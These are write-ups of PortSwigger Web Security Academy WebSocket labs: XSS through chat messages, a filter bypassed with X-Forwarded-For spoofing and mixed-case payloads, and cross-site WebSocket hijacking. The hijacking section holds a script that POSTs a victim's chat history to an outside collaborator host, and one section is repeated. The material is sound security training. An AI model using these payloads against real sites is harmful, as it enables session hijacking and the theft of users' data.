
# Manipulating WebSocket messages to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

Chat messages that you submit are viewed by a support agent in real time.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

---------------------------------------------

Reference: https://portswigger.net/web-security/websockets

---------------------------------------------

Generated link: https://0a32005803392a6a81b1cb9d009d0044.web-security-academy.net/chat

Payload:

```
script><img src=1 onerror='alert(1)'></script>
```



![img](images/Manipulating%20WebSocket%20messages%20to%20exploit%20vulnerabilities/1.png)


# Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Hint: If you're struggling to bypass the XSS filter, try out our XSS labs. Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.

---------------------------------------------

References: 

- https://portswigger.net/web-security/websockets

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For





![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/1.png)
![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/2.png)

---------------------------------------------

Generated link: https://0ad6009d046afe8e89234bb0009e00bc.web-security-academy.net/


Using the payload from a previous lab I get an error because Javascript is detected:

```
script><img src=1 onerror='alert(1)'></script>
```






![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/3.png)
![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/4.png)

And the IP address gets blocked so we can not access “/chat”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/5.png)

The X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

We will try with 127.0.0.1 or localhost to find if the detection is evaded.

```
X-Forwarded-For: 127.0.0.1
```

If we add this HTTP header, we can access “/chat”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/6.png)

In the options section I will add a rule to add this header to all requests:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/7.png)

But if we send it to repeater and try the payload, the attack is detected again and the chat ends:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/8.png)

Everytime this happens we must change the IP address in the X-Forwarded-For HTTP header.

<img src=x onerror=alert(1)>


“<script” closes the connection but “<ScRIpT” does not:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/9.png)

The same happens with “alert(1)” and "aLeRT(1)" or “alert`1`”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/10.png)

However, this payload is not working:

```
ScRIpT><ScRIpT>alert`1`</ScRIpT>
```

Finally it works but using the img with incorrect source payload:

```
ScRIpT><iMg sRc=x OnErRoR=alert`1`>
```



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/11.png)


# Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

---------------------------------------------

The request to /chat does not contain a CSRF token:



![img](images/Cross-site%20WebSocket%20hijacking/1.png)


Before sending anything, the message “READY” is sent and the server responds:





![img](images/Cross-site%20WebSocket%20hijacking/2.png)
![img](images/Cross-site%20WebSocket%20hijacking/3.png)


Then it is possible to send messages:





![img](images/Cross-site%20WebSocket%20hijacking/4.png)
![img](images/Cross-site%20WebSocket%20hijacking/5.png)



Payload:

```
<script>
    var ws = new WebSocket('wss://0ab10034038a49a581f67501001e002b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://v95x1aaxyvlt8fptdelcbw94ovumie63.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```






![img](images/Cross-site%20WebSocket%20hijacking/6.png)
![img](images/Cross-site%20WebSocket%20hijacking/7.png)


# 18 - Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Hint: If you're struggling to bypass the XSS filter, try out our XSS labs. Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.

---------------------------------------------

References: 

- https://portswigger.net/web-security/websockets

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For





![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/1.png)
![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/2.png)

---------------------------------------------

Generated link: https://0ad6009d046afe8e89234bb0009e00bc.web-security-academy.net/


Using the payload from a previous lab I get an error because Javascript is detected:

```
script><img src=1 onerror='alert(1)'></script>
```






![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/3.png)
![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/4.png)

And the IP address gets blocked so we can not access “/chat”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/5.png)

The X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

We will try with 127.0.0.1 or localhost to find if the detection is evaded.

```
X-Forwarded-For: 127.0.0.1
```

If we add this HTTP header, we can access “/chat”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/6.png)

In the options section I will add a rule to add this header to all requests:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/7.png)

But if we send it to repeater and try the payload, the attack is detected again and the chat ends:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/8.png)

Everytime this happens we must change the IP address in the X-Forwarded-For HTTP header.

“<script” closes the connection but “<ScRIpT” does not:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/9.png)

The same happens with “alert(1)” and "aLeRT(1)" or “alert`1`”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/10.png)

However, this payload is not working:

```
ScRIpT><ScRIpT>alert`1`</ScRIpT>
```

Finally it works but using the img with incorrect source payload:

```
ScRIpT><iMg sRc=x OnErRoR=alert`1`>
```



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/11.png)
